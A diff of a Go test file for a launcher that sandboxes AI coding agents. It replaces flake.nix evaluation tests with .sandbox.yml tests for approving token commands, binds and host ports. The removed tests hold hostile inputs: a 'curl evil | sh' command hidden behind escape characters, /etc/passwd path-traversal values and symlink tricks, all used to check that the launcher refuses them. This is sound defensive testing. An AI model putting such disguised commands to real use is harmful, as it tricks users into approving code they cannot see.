@@ -6,7 +6,6 @@ import (
 	"crypto/ed25519"
 	"crypto/rand"
 	"encoding/base64"
-	"encoding/json/v2"
 	"fmt"
 	"maps"
 	"net"
@@ -89,37 +88,6 @@ func waitReady() int {
 }
 
 func (h *harness) tool(name string) string { return filepath.Join(h.tools, name) }
-
-// storeFile is content in a store path, which is all the launcher takes
-// for a built config or manifest; skips without a nix to add it.
-func (h *harness) storeFile(name, content string) string {
-	h.t.Helper()
-	path := filepath.Join(h.tmp, name)
-	os.WriteFile(path, []byte(content), 0o644)
-	out, err := exec.Command("nix-store", "--add", path).Output()
-	if err != nil {
-		h.t.Skip("needs nix-store --add (no nix daemon here)")
-	}
-	return strings.TrimSpace(string(out))
-}
-
-// storePath is the file, link or directory at path in the store, as it is.
-func (h *harness) storePath(path string) string {
-	h.t.Helper()
-	out, err := exec.Command("nix-store", "--add", path).Output()
-	if err != nil {
-		h.t.Skip("needs nix-store --add (no nix daemon here)")
-	}
-	return strings.TrimSpace(string(out))
-}
-
-func marshal(t *testing.T, v any) string {
-	data, err := json.Marshal(v)
-	if err != nil {
-		t.Fatal(err)
-	}
-	return string(data)
-}
 
 // -- where it runs --
 
@@ -316,8 +284,8 @@ func TestLoginShellOrCommand(t *testing.T) {
 		t.Errorf("%q %q", r.pasta(t).command(), r.stdout)
 	}
 	// Options end at the command.
-	r = h.run("", nil, "--reload", "echo", "--reload")
-	if r.stdout != "--reload\n" {
+	r = h.run("", nil, "--no-project-config", "echo", "--no-project-config")
+	if r.stdout != "--no-project-config\n" {
 		t.Errorf("%q", r.stdout)
 	}
 	if got := h.run("", nil, "--no-project-config", "--", "--weird").pasta(t).command(); !slices.Equal(got, []string{"--weird"}) {
@@ -385,9 +353,10 @@ func TestHostPortsAndDNS(t *testing.T) {
 	}
 }
 
-func TestAgentsMdAndExchange(t *testing.T) {
+func TestEtcAndExchange(t *testing.T) {
 	h := newHarness(t)
-	h.cfg.FHS.AgentsMd = "/store/AGENTS.md"
+	h.cfg.Etc = []etcFile{{Path: "sandbox/AGENTS.md", Source: "/store/AGENTS.md"},
+		{Path: "claude-code/managed-settings.json", Source: "/store/settings.json"}}
 	exchange := filepath.Join(h.volume(), "exchange")
 	os.MkdirAll(filepath.Join(exchange, "sub"), 0o755)
 	target := filepath.Join(h.tmp, "host-file")
@@ -396,9 +365,11 @@ func TestAgentsMdAndExchange(t *testing.T) {
 	os.Symlink(target, filepath.Join(exchange, "sub/bar"))
 	os.WriteFile(filepath.Join(exchange, "kept.txt"), []byte("host output"), 0o644)
 	inv := h.run("", nil).pasta(t)
-	if !slices.Contains(inv.mounts(), "--ro-bind /store/AGENTS.md /etc/sandbox/AGENTS.md") ||
-		slices.ContainsFunc(inv.mounts(), func(m string) bool { return strings.Contains(m, "/etc/claude-code") }) {
-		t.Errorf("%q", inv.mounts())
+	for _, want := range []string{"--ro-bind /store/AGENTS.md /etc/sandbox/AGENTS.md",
+		"--ro-bind /store/settings.json /etc/claude-code/managed-settings.json"} {
+		if !slices.Contains(inv.mounts(), want) {
+			t.Errorf("%q not in %q", want, inv.mounts())
+		}
 	}
 	// The host tees into it; a link planted there would aim that write at
 	// any host file.
@@ -418,280 +389,15 @@ func TestAgentsMdAndExchange(t *testing.T) {
 	}
 }
 
-// -- flake.nix --
+// -- .sandbox.yml --
 
-// manifestJSON is m as manifest.nix writes it: null for no command or
-// GitHub token command.
-func manifestJSON(t *testing.T, m manifest) string {
-	v := map[string]any{"binds": []bind{}, "hostPorts": []string{}, "command": nil,
-		"githubTokenCommand": nil, "forgejoTokenCommands": map[string]string{}, "claudeApiKeyCommand": nil,
-		"gitSigningKey": nil, "gitSigningKeyCommand": nil, "gitFromHost": m.GitFromHost}
-	if m.GitSigningKey != "" {
-		v["gitSigningKey"] = m.GitSigningKey
-	}
-	if m.GitSigningKeyCommand != "" {
-		v["gitSigningKeyCommand"] = m.GitSigningKeyCommand
-	}
-	if m.ClaudeAPIKeyCommand != "" {
-		v["claudeApiKeyCommand"] = m.ClaudeAPIKeyCommand
-	}
-	if m.GitHubTokenCommand != "" {
-		v["githubTokenCommand"] = m.GitHubTokenCommand
-	}
-	if m.ForgejoTokenCommands != nil {
-		v["forgejoTokenCommands"] = m.ForgejoTokenCommands
-	}
-	if m.Binds != nil {
-		v["binds"] = m.Binds
-	}
-	if m.HostPorts != nil {
-		v["hostPorts"] = m.HostPorts
-	}
-	if m.Command != nil {
-		v["command"] = m.Command
-	}
-	if m.Wayland.Enable || m.Wayland.Globals != nil {
-		v["wayland"] = m.Wayland
-	}
-	return marshal(t, v)
+// withLocal writes the project's .sandbox.yml.
+func (h *harness) withLocal(content string) {
+	os.WriteFile(filepath.Join(h.project, localConfigFileName), []byte(content), 0o644)
 }
 
-// withProject writes a flake.nix whose evaluation (by the stand-in nix)
-// gives m.
-func (h *harness) withProject(m manifest, content, name string) string {
-	os.WriteFile(filepath.Join(h.project, projectFileName), []byte(content), 0o644)
-	out := h.storeFile(name, manifestJSON(h.t, m))
-	h.env["FAKE_NIX_OUT"] = out
-	return out
-}
-
-// Without its own flake.nix's config.
-func TestProjectIsEvaluatedInASandboxOfItself(t *testing.T) {
-	h := newHarness(t)
-	h.withProject(manifest{}, "{ ... }: { }\n", "m.json")
-	r := h.run("", nil)
-	if r.code != 0 {
-		t.Fatal(r.stderr)
-	}
-	want := []string{"build", "--no-link", "--print-out-paths", "--file", "/store/project.nix",
-		"--argstr", "nixpkgs", "/store/nixpkgs", "--argstr", "system", "x86_64-linux",
-		"--argstr", "flake", h.project}
-	if calls := r.calls("nix"); len(calls) != 1 || !slices.Equal(calls[0], want) {
-		t.Errorf("nix %q", calls)
-	}
-	pastas := r.calls("pasta")
-	if len(pastas) != 2 {
-		t.Fatalf("pasta %d times", len(pastas))
-	}
-	inner, outer := parseInvocation(t, pastas[0]), parseInvocation(t, pastas[1])
-	if !slices.Equal(inner.command()[:2], []string{"nix", "build"}) || inner.chdir != h.project || outer.command() != nil {
-		t.Errorf("inner %q, outer %q", inner.command(), outer.command())
-	}
-}
-
-// What evaluates flake.nix is the project's code: it gets no guard, no
-// token and no host port, and the user's token commands run once, for the
-// sandbox itself.
-func TestProjectEvaluationHasNoGuards(t *testing.T) {
-	h := newHarness(t)
-	ran := filepath.Join(h.tmp, "ran")
-	h.cfg.Default.GitHubTokenCommand = "echo x >> " + ran + "; echo github_pat_" + strings.Repeat("t", 30)
-	h.cfg.Guards.OpenURL = true
-	h.cfg.Guards.SSHAgent.Enable = true
-	h.cfg.HostPorts = []string{"5037"}
-	h.withProject(manifest{}, "{ ... }: { }\n", "m.json")
-	r := h.run("", map[string]string{"SSH_AUTH_SOCK": filepath.Join(h.tmp, "agent.sock"), "SANDBOX_HOST_PORTS": "5038"})
-	pastas := r.calls("pasta")
-	if r.code != 0 || len(pastas) != 2 {
-		t.Fatalf("%d %q", r.code, r.stderr)
-	}
-	inner, outer := parseInvocation(t, pastas[0]), parseInvocation(t, pastas[1])
-	for _, name := range []string{"SANDBOX_GH_PROXY", "GH_TOKEN", "SSH_AUTH_SOCK", "BROWSER", "SANDBOX_CA_FILE"} {
-		if _, ok := inner.setenv()[name]; ok {
-			t.Errorf("%s where flake.nix is evaluated", name)
-		}
-		if _, ok := outer.setenv()[name]; !ok {
-			t.Errorf("no %s in the sandbox", name)
-		}
-	}
-	if inner.pastaOpt("-T") != "none" || outer.tcpPorts() != "5037,5038" {
-		t.Errorf("host ports: inner %q, outer %q", inner.pastaOpt("-T"), outer.tcpPorts())
-	}
-	if data, _ := os.ReadFile(ran); string(data) != "x\n" {
-		t.Errorf("the token command ran %q", data)
-	}
-}
-
-func TestProjectEvaluationIsCached(t *testing.T) {
-	h := newHarness(t)
-	h.withProject(manifest{Command: []string{"echo", "n1"}}, "{ ... }: { }\n", "m.json")
-	evaluations := func(args ...string) int {
-		t.Helper()
-		r := h.run("", nil, args...)
-		if r.code != 0 {
-			t.Fatal(r.stderr)
-		}
-		return len(r.calls("nix"))
-	}
-	for i, want := range []int{1, 0} {
-		if got := evaluations(); got != want {
-			t.Errorf("run %d: %d evaluations", i, got)
-		}
-	}
-	// Changed - flake.nix or its lock - or reloaded, it's evaluated again.
-	os.WriteFile(filepath.Join(h.project, projectFileName), []byte("{ ... }: { command = [ \"n2\" ]; }\n"), 0o644)
-	if evaluations() != 1 || evaluations() != 0 || evaluations("--reload") != 1 {
-		t.Error("not re-evaluated after a change or --reload")
-	}
-	os.WriteFile(filepath.Join(h.project, lockFileName), []byte("{}"), 0o644)
-	if evaluations() != 1 || evaluations() != 0 {
-		t.Error("not re-evaluated after a new lock")
-	}
-	// A cache that doesn't name a store path is ignored.
-	cache := filepath.Join(h.volume(), "project.json")
-	data, _ := os.ReadFile(cache)
-	var c cached
-	json.Unmarshal(data, &c)
-	os.WriteFile(cache, []byte(marshal(t, cached{Key: c.Key, Result: "/etc/passwd"})), 0o644)
-	if evaluations() != 1 {
-		t.Error("a cache naming /etc/passwd was used")
-	}
-}
-
-func TestProjectAddsToTheProfile(t *testing.T) {
-	h := newHarness(t)
-	h.withProject(manifest{Command: []string{"echo", "from-manifest"}}, "{ ... }: { }\n", "m.json")
-	r := h.run("", nil)
-	inv := r.pasta(t)
-	if !slices.Equal(inv.command(), []string{"echo", "from-manifest"}) || r.stdout != "from-manifest\n" {
-		t.Errorf("%q %q", inv.command(), r.stdout)
-	}
-	// A sandbox.nix left from before is only warned about.
-	if strings.Contains(r.stderr, "sandbox.nix") {
-		t.Errorf("%q", r.stderr)
-	}
-	os.WriteFile(filepath.Join(h.project, oldProjectFileName), nil, 0o644)
-	if r := h.run("", nil); r.code != 0 || !strings.Contains(r.stderr, "sandbox.nix is no longer read") {
-		t.Errorf("%d %q", r.code, r.stderr)
-	}
-	// A command given wins; --no-project-config skips it all.
-	if got := h.run("", nil, "echo", "given").pasta(t).command(); !slices.Equal(got, []string{"echo", "given"}) {
-		t.Errorf("%q", got)
-	}
-	if r := h.run("", nil, "--no-project-config"); len(r.calls("nix")) != 0 || r.pasta(t).command() != nil {
-		t.Error("flake.nix used with --no-project-config")
-	}
-}
-
-func TestBadManifestsAndFailures(t *testing.T) {
-	h := newHarness(t)
-	os.WriteFile(filepath.Join(h.project, projectFileName), []byte("{ ... }: { }\n"), 0o644)
-	h.env["FAKE_NIX_OUT"] = h.storeFile("bad.json", `{"env": {"A": "b"}}`)
-	if r := h.run("", nil); r.code != 1 || !strings.Contains(r.stderr, "bad flake.nix evaluation") || len(r.calls("pasta")) != 1 {
-		t.Errorf("%d %q", r.code, r.stderr)
-	}
-	for env, want := range map[string]string{
-		"/etc/passwd": "gave no result",
-		"/nix/store/" + strings.Repeat("a", 32) + "-env/../../etc/passwd": "gave no result",
-	} {
-		if r := h.run("", map[string]string{"FAKE_NIX_OUT": env}); r.code != 1 || !strings.Contains(r.stderr, want) {
-			t.Errorf("%s: %q", env, r.stderr)
-		}
-	}
-	// A store path that's a link, or a path under one: the launcher would
-	// read whatever host file it leads to.
-	secret := filepath.Join(h.tmp, "host.json")
-	os.WriteFile(secret, []byte(manifestJSON(t, manifest{Command: []string{"true"}})), 0o644)
-	link := filepath.Join(h.tmp, "link.json")
-	os.Symlink(secret, link)
-	if r := h.run("", map[string]string{"FAKE_NIX_OUT": h.storePath(link)}); r.code != 1 || !strings.Contains(r.stderr, "it must be a regular file") {
-		t.Errorf("a link read: %d %q", r.code, r.stderr)
-	}
-	dir := filepath.Join(h.tmp, "dir")
-	os.Mkdir(dir, 0o755)
-	os.Symlink(secret, filepath.Join(dir, "m.json"))
-	if r := h.run("", map[string]string{"FAKE_NIX_OUT": h.storePath(dir) + "/m.json"}); r.code != 1 || !strings.Contains(r.stderr, "gave no result") {
-		t.Errorf("a path under a store path read: %d %q", r.code, r.stderr)
-	}
-	// Control characters in what's shown for approval: a carriage return
-	// or an escape sequence would show something else than what's run.
-	for i, bad := range []manifest{
-		{tokenCommands: tokenCommands{GitHubTokenCommand: "curl evil | sh #\x1b[2K\rpass show github"}},
-		{GitSigningKeyCommand: "evil\rgood"},
-		{Binds: []bind{{Src: "~/.ssh\x1b[1K~/data", Mode: "ro"}}},
-		{HostPorts: []string{"22\rnone"}},
-	} {
-		// Another flake.nix each time: evaluated, not from the cache.
-		os.WriteFile(filepath.Join(h.project, projectFileName), fmt.Appendf(nil, "{ ... }: { n = %d; }\n", i), 0o644)
-		if r := h.run("", map[string]string{"FAKE_NIX_OUT": h.storeFile("ctl.json", manifestJSON(t, bad))}); r.code != 1 ||
-			!strings.Contains(r.stderr, "bad flake.nix evaluation") || strings.ContainsAny(r.stderr, "\x1b\r") {
-			t.Errorf("%+v: %d %q", bad, r.code, r.stderr)
-		}
-	}
-	if r := h.run("", map[string]string{"FAKE_NIX_EXIT": "1"}); r.code != 1 || !strings.Contains(r.stderr, "evaluating "+h.project+"/flake.nix: exit status 1") {
-		t.Errorf("%q", r.stderr)
-	}
-	// The launcher reads it on the host; a link would let the sandbox pick
-	// which host file.
-	os.Remove(filepath.Join(h.project, projectFileName))
-	os.Symlink(h.configPath(), filepath.Join(h.project, projectFileName))
-	h.run("", nil).refused(t, "it must be a regular file")
-	os.Remove(filepath.Join(h.project, projectFileName))
-	os.WriteFile(filepath.Join(h.project, projectFileName), nil, 0o644)
-	os.Symlink(h.configPath(), filepath.Join(h.project, lockFileName))
-	h.run("", nil).refused(t, "it must be a regular file")
-}
-
-func TestHostAccessIsApprovedOnTheTerminal(t *testing.T) {
-	h := newHarness(t)
-	access := manifest{Command: []string{"true"}, HostPorts: []string{"5432"},
-		Binds: []bind{{Src: "~/d", Mode: "rw"}, {Src: "/srv/x", Dst: "/x", Mode: "ro", Optional: true}}}
-	h.withProject(access, "{ ... }: { }\n", "m.json")
-	if r := h.run("", nil); r.code != 1 || !strings.Contains(r.stderr, "start the sandbox from a terminal to approve it") || len(r.calls("pasta")) != 1 {
-		t.Errorf("%d %q", r.code, r.stderr) // Only the evaluation ran.
-	}
-
-	p := h.pty(nil)
-	shown := p.expect("Allow? [y/N] ")
-	for _, want := range []string{h.project + "/flake.nix asks for host access", "bind ~/d (read-write)", "bind /srv/x at /x (read-only, optional)", "host port 5432"} {
-		if !strings.Contains(shown, want) {
-			t.Errorf("%q not in %q", want, shown)
-		}
-	}
-	p.send("y\r")
-	r := p.wait()
-	inv := r.pasta(t)
-	if r.code != 0 || !slices.Contains(inv.mounts(), "--bind "+h.home+"/d "+h.home+"/d") || !slices.Contains(inv.mounts(), "--ro-bind-try /srv/x /x") || inv.tcpPorts() != "5432" {
-		t.Errorf("%d %q", r.code, inv.mounts())
-	}
-	// Not again, even without a terminal.
-	if r := h.run("", nil); r.code != 0 {
-		t.Errorf("asked again: %q", r.stderr)
-	}
-	// Changed: asked again.
-	access.HostPorts = append(access.HostPorts, "22")
-	h.withProject(access, "{ ... }: { x = 1; }\n", "m2.json")
-	p = h.pty(nil)
-	if !strings.Contains(p.expect("Allow? [y/N] "), "host port 22") {
-		t.Error("change not shown")
-	}
-	p.send("n\r")
-	if r := p.wait(); r.code != 1 || !strings.Contains(r.stdout, "host access not approved, not starting") || len(r.calls("pasta")) != 1 {
-		t.Errorf("%d %q", r.code, r.stdout)
-	}
-}
-
-// Each thing is approved on its own. So a start that uses less of what's
-// approved - here the user's own config has a token command, as a sandbox
-// installed with one has and `nix run` hasn't - doesn't ask, and going back
-// and forth between the two asks once each, not every time.
 func TestApprovalsAreKeptItemByItem(t *testing.T) {
 	h := newHarness(t)
-	n := 0
-	with := func(m manifest) {
-		n++
-		h.withProject(m, fmt.Sprintf("{ ... }: { n = %d; }\n", n), fmt.Sprintf("m%d.json", n))
-	}
 	// asks says whether a start asks, and for what; it answers yes.
 	asks := func() (shown string, asked bool) {
 		t.Helper()
@@ -707,18 +413,19 @@ func TestApprovalsAreKeptItemByItem(t *testing.T) {
 		return shown, true
 	}
 	token := "github_pat_" + strings.Repeat("t", 30)
-	mine, theirs := "echo mine"+token, "echo theirs"+token
-	m := manifest{HostPorts: []string{"5432", "22"}, tokenCommands: tokenCommands{GitHubTokenCommand: theirs}}
-	with(m)
+	mine, theirs, forgejo := "echo mine"+token, "echo theirs"+token, "echo forgejo"+strings.Repeat("f", 40)
+	both := "guards:\n  github:\n    tokenCommand: " + theirs + "\n  forgejo:\n    tokenCommands:\n      codeberg.org: " + forgejo + "\n"
+	h.withLocal(both)
 
-	// The user's config has the command: only the ports are asked about.
+	// The user's config has the GitHub command: only Forgejo's is asked
+	// about.
 	h.cfg.Default.GitHubTokenCommand = mine
-	if shown, asked := asks(); !asked || !strings.Contains(shown, "host port 22") || strings.Contains(shown, theirs) {
+	if shown, asked := asks(); !asked || !strings.Contains(shown, forgejo) || strings.Contains(shown, theirs) {
 		t.Errorf("with the user's command: %v %q", asked, shown)
 	}
-	// Without it the project's command is new, and shown with the rest.
+	// Without it the file's command is new, and shown with the rest.
 	h.cfg.Default.GitHubTokenCommand = ""
-	if shown, asked := asks(); !asked || !strings.Contains(shown, "host port 22") || !strings.Contains(shown, theirs) {
+	if shown, asked := asks(); !asked || !strings.Contains(shown, forgejo) || !strings.Contains(shown, theirs) {
 		t.Errorf("without: %v %q", asked, shown)
 	}
 	// Both are approved now, whichever is started.
@@ -728,95 +435,25 @@ func TestApprovalsAreKeptItemByItem(t *testing.T) {
 			t.Errorf("asked again with %q: %q", command, shown)
 		}
 	}
-
-	// Asking for less takes no yes...
-	m.HostPorts = []string{"5432"}
-	with(m)
+	// Asking for less takes no yes; what was dropped is asked about when
+	// it's back.
+	h.withLocal("guards:\n  github:\n    tokenCommand: " + theirs + "\n")
 	if shown, asked := asks(); asked {
 		t.Errorf("less: %q", shown)
 	}
-	// ...and what was dropped is asked about when it's back, also after a
-	// project that asked for nothing.
-	m.HostPorts = []string{"5432", "22"}
-	with(m)
-	if shown, asked := asks(); !asked || !strings.Contains(shown, "host port 22") {
+	h.withLocal(both)
+	if shown, asked := asks(); !asked || !strings.Contains(shown, forgejo) {
 		t.Errorf("back: %v %q", asked, shown)
 	}
-	with(manifest{})
-	if shown, asked := asks(); asked {
-		t.Errorf("nothing: %q", shown)
-	}
-	with(m)
-	if _, asked := asks(); !asked {
-		t.Error("everything back: not asked")
-	}
-
-	// The binds are approved as the list they are: one may be there to
-	// cover part of another, so a part of the list is asked about.
-	m = manifest{Binds: []bind{{Src: "/srv", Mode: "rw"}, {Src: "/srv/keys", Mode: "ro"}}}
-	with(m)
-	if _, asked := asks(); !asked {
-		t.Error("binds: not asked")
-	}
-	m.Binds = m.Binds[:1]
-	with(m)
-	if shown, asked := asks(); !asked || !strings.Contains(shown, "bind /srv (read-write)") {
-		t.Errorf("fewer binds: %v %q", asked, shown)
+	// --no-project-config reads none of it.
+	h.withLocal("guards:\n  github:\n    tokenCommand: exit 3\n")
+	if r := h.run("", nil, "--no-project-config"); r.code != 0 {
+		t.Errorf("--no-project-config: %d %q", r.code, r.stderr)
 	}
 }
 
-// An approval is for where a bind leads, not for its name: a source the
-// sandbox could aim elsewhere afterwards is refused, and one that leads
-// somewhere else than approved is asked about again.
-func TestApprovedBindsAreResolved(t *testing.T) {
-	h := newHarness(t)
-	n := 0
-	with := func(src string) {
-		n++
-		h.withProject(manifest{Binds: []bind{{Src: src, Mode: "ro"}}}, fmt.Sprintf("{ ... }: { n = %d; }\n", n), fmt.Sprintf("b%d.json", n))
-	}
-	os.MkdirAll(filepath.Join(h.project, "data"), 0o755)
-	os.MkdirAll(h.volume(), 0o755)
-	os.Symlink(h.project, filepath.Join(h.home, "to-project"))
-	for src, want := range map[string]string{
-		"data":                   "not an absolute path",
-		h.project + "/data":      "which the sandbox can write",
-		"~/to-project/data":      "which the sandbox can write",
-		h.volume() + "/home":     "which the sandbox can write",
-		filepath.Dir(h.volume()): "which the sandbox can write",
-	} {
-		with(src)
-		if r := h.run("", nil); r.code != 1 || !strings.Contains(r.stderr, want) || len(r.calls("pasta")) > 1 {
-			t.Errorf("%s: %d %q", src, r.code, r.stderr)
-		}
-	}
-
-	a, b := filepath.Join(h.home, "a"), filepath.Join(h.home, "b")
-	os.Mkdir(a, 0o755)
-	os.Mkdir(b, 0o755)
-	os.Symlink(a, filepath.Join(h.home, "link"))
-	with("~/link")
-	p := h.pty(nil)
-	if shown := p.expect("Allow? [y/N] "); !strings.Contains(shown, "bind ~/link -> "+a+" (read-only)") {
-		t.Errorf("%q", shown)
-	}
-	p.send("y\r")
-	if r := p.wait(); r.code != 0 || !slices.Contains(r.pasta(t).mounts(), "--ro-bind "+a+" "+a) {
-		t.Errorf("%d %q", r.code, r.stdout)
-	}
-	if r := h.run("", nil); r.code != 0 {
-		t.Errorf("asked again: %q", r.stderr)
-	}
-	os.Remove(filepath.Join(h.home, "link"))
-	os.Symlink(b, filepath.Join(h.home, "link"))
-	if r := h.run("", nil); r.code != 1 || !strings.Contains(r.stderr, "isn't approved yet") {
-		t.Errorf("a link aimed elsewhere not asked about: %d %q", r.code, r.stderr)
-	}
-}
-
-// .sandbox.env: its token commands go over the flake's and are approved
-// like them, even without a flake.nix; its git settings apply inside
-// without asking.
+// .sandbox.yml: its token commands are approved first; its git settings
+// apply inside without asking.
 func TestLocalConfig(t *testing.T) {
 	h := newHarness(t)
 	mark := filepath.Join(h.tmp, "ran")
@@ -834,9 +471,9 @@ func TestLocalConfig(t *testing.T) {
 		t.Errorf("git: %d %q %v", r.code, r.stderr, env)
 	}
 
-	// A token command: asked first, naming both files.
+	// A token command: asked first.
 	write("guards:\n  github:\n    tokenCommand: touch " + mark + "; echo " + token + "\n  claudeApiKey:\n    tokenCommand: echo " + claudeKey + "\n")
-	if r := h.run("", nil); r.code != 1 || !strings.Contains(r.stderr, "(or .sandbox.yml) asks for host access") || exists(mark) {
+	if r := h.run("", nil); r.code != 1 || !strings.Contains(r.stderr, ".sandbox.yml asks to run commands on the host") || exists(mark) {
 		t.Errorf("unapproved: %d %q", r.code, r.stderr)
 	}
 	p := h.pty(nil)
@@ -853,13 +490,6 @@ func TestLocalConfig(t *testing.T) {
 	}
 	if env := r.pasta(t).setenv(); env["ANTHROPIC_UNIX_SOCKET"] == "" {
 		t.Errorf("no Claude API guard: %v", env)
-	}
-
-	// Over the flake's: what's left is what was approved, so not asked.
-	os.Remove(mark)
-	h.withProject(manifest{tokenCommands: tokenCommands{GitHubTokenCommand: "echo theirs" + token}}, "{ ... }: { }\n", "m.json")
-	if r := h.run("", nil); r.code != 0 || !exists(mark) {
-		t.Errorf("not .sandbox.env's: %d %q", r.code, r.stderr)
 	}
 
 	// The signing key from a command: approved like the token commands, its
@@ -881,22 +511,9 @@ func TestLocalConfig(t *testing.T) {
 		t.Errorf("bad key: %d %q", r.code, r.stdout)
 	}
 
-	// From the flake, for everyone: approved and used without a
-	// .sandbox.env; a .sandbox.env's own key wins, and the command then
-	// isn't asked about.
-	os.Remove(filepath.Join(h.project, localConfigFileName))
-	h.withProject(manifest{GitSigningKeyCommand: "echo ssh-ed25519 AAAAteam"}, "{ ... }: { y = 1; }\n", "m3.json")
-	p = h.pty(nil)
-	if shown := p.expect("Allow? [y/N] "); !strings.Contains(shown, "for git's signing key:") {
-		t.Errorf("not shown: %q", shown)
-	}
-	p.send("y\r")
-	if r := p.wait(); r.code != 0 || r.pasta(t).setenv()["GIT_CONFIG_VALUE_0"] != "ssh-ed25519 AAAAteam" {
-		t.Errorf("the flake's key: %d %q", r.code, r.stdout)
-	}
 	write("git:\n  signingKey: ssh-ed25519 AAAAmine\n")
 	if r := h.run("", nil); r.code != 0 || r.pasta(t).setenv()["GIT_CONFIG_VALUE_0"] != "ssh-ed25519 AAAAmine" {
-		t.Errorf(".sandbox.env's key: %d %q", r.code, r.stderr)
+		t.Errorf(".sandbox.yml's key: %d %q", r.code, r.stderr)
 	}
 
 	// Host commands run from /, not the project.
@@ -908,12 +525,12 @@ func TestLocalConfig(t *testing.T) {
 		t.Errorf("not run from /: %d %q", r.code, r.stdout)
 	}
 
-	// The host's git identity, for the flake's git.fromHost: under what
-	// .sandbox.env sets, and off with GIT_FROM_HOST=0.
+	// The host's git identity, for the config's git.fromHost: under what
+	// .sandbox.yml sets, which can turn it off.
 	bin := t.TempDir()
 	os.WriteFile(filepath.Join(bin, "git"), []byte("#!/bin/sh\nprintf 'user.name\\nHost\\0user.email\\nhost@example.com\\0'\n"), 0o755)
 	withGit := map[string]string{"PATH": bin + ":" + h.env["PATH"]}
-	h.withProject(manifest{GitFromHost: true}, "{ ... }: { z = 1; }\n", "m4.json")
+	h.cfg.Git.FromHost = true
 	write("git:\n  userName: Mine\n")
 	r = h.run("", withGit)
 	env = r.pasta(t).setenv()
@@ -941,7 +558,7 @@ const claudeKey = "sk-ant-api03-kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk"
 
 // A Claude API key command puts Claude Code on the proxy: from the user's
 // config (here a profile's, for this project only) or, approved, from
-// the flake; without one, Claude Code logs in inside as usual.
+// .sandbox.yml; without one, Claude Code logs in inside as usual.
 func TestClaudeAPIKey(t *testing.T) {
 	h := newHarness(t)
 	onKey := func(r *result) bool {
@@ -961,20 +578,20 @@ func TestClaudeAPIKey(t *testing.T) {
 	h.cfg.Profiles[0].ClaudeAPIKeyCommand = "echo 'x y'"
 	h.run("", nil).refused(t, "guards.claudeApiKey.tokenCommand (echo 'x y') didn't print a token")
 
-	// From the flake: approved first.
+	// From .sandbox.yml: approved first.
 	h.cfg.Profiles = nil
-	h.withProject(manifest{tokenCommands: tokenCommands{ClaudeAPIKeyCommand: "echo " + claudeKey}}, "{ ... }: { }\n", "m.json")
+	h.withLocal("guards:\n  claudeApiKey:\n    tokenCommand: echo " + claudeKey + "\n")
 	p := h.pty(nil)
 	if !strings.Contains(p.expect("Allow? [y/N] "), "for Claude Code's API key:") {
 		t.Error("not shown")
 	}
 	p.send("y\r")
 	if r := p.wait(); r.code != 0 || !onKey(r) {
-		t.Errorf("the flake: %d %q", r.code, r.stdout)
+		t.Errorf(".sandbox.yml: %d %q", r.code, r.stdout)
 	}
 }
 
-// Token commands: the user's config's run as they are; the flake's only
+// Token commands: the user's config's run as they are; .sandbox.yml's only
 // once approved on the terminal, asked once and again when they change.
 // Either way the token reaches the guard, and a failing command stops the
 // start.
@@ -1002,14 +619,14 @@ func TestTokenCommands(t *testing.T) {
 		defer os.Remove(mark)
 		return exists(mark)
 	}
-	m := manifest{tokenCommands: tokenCommands{GitHubTokenCommand: "touch " + mark + "; echo " + token}}
-	h.withProject(m, "{ ... }: { }\n", "m.json")
-	if r := h.run("", nil); r.code != 1 || !strings.Contains(r.stderr, "start the sandbox from a terminal to approve it") || ran() {
+	command := "touch " + mark + "; echo " + token
+	h.withLocal("guards:\n  github:\n    tokenCommand: " + command + "\n")
+	if r := h.run("", nil); r.code != 1 || !strings.Contains(r.stderr, "start the sandbox from a terminal to approve them") || ran() {
 		t.Errorf("unapproved: %d %q", r.code, r.stderr)
 	}
 	p := h.pty(nil)
 	shown := p.expect("Allow? [y/N] ")
-	for _, want := range []string{"run on this host at each start, for the GitHub token:", "    " + m.GitHubTokenCommand,
+	for _, want := range []string{"run on this host at each start, for the GitHub token:", "    " + command,
 		"the commands run on this host as you, outside the sandbox", "This is asked once, and again only for something new"} {
 		if !strings.Contains(shown, want) {
 			t.Errorf("%q not in %q", want, shown)
@@ -1024,10 +641,10 @@ func TestTokenCommands(t *testing.T) {
 	}
 
 	// Changed: asked again, and declined, not run.
-	m.GitHubTokenCommand = "touch " + mark + "; echo other" + token
-	h.withProject(m, "{ ... }: { x = 1; }\n", "m2.json")
+	command = "touch " + mark + "; echo other" + token
+	h.withLocal("guards:\n  github:\n    tokenCommand: " + command + "\n")
 	p = h.pty(nil)
-	if !strings.Contains(p.expect("Allow? [y/N] "), m.GitHubTokenCommand) {
+	if !strings.Contains(p.expect("Allow? [y/N] "), command) {
 		t.Error("change not shown")
 	}
 	p.send("n\r")
@@ -1035,10 +652,10 @@ func TestTokenCommands(t *testing.T) {
 		t.Errorf("declined: %d %q", r.code, r.stdout)
 	}
 
-	// The user's config wins: the flake's is neither asked about nor run.
+	// The user's config wins: the file's is neither asked about nor run.
 	h.cfg.Default.GitHubTokenCommand = "echo " + token
 	if r := h.run("", nil); r.code != 0 || ran() {
-		t.Errorf("config over the flake: %d %q", r.code, r.stderr)
+		t.Errorf("config over .sandbox.yml: %d %q", r.code, r.stderr)
 	}
 }
 
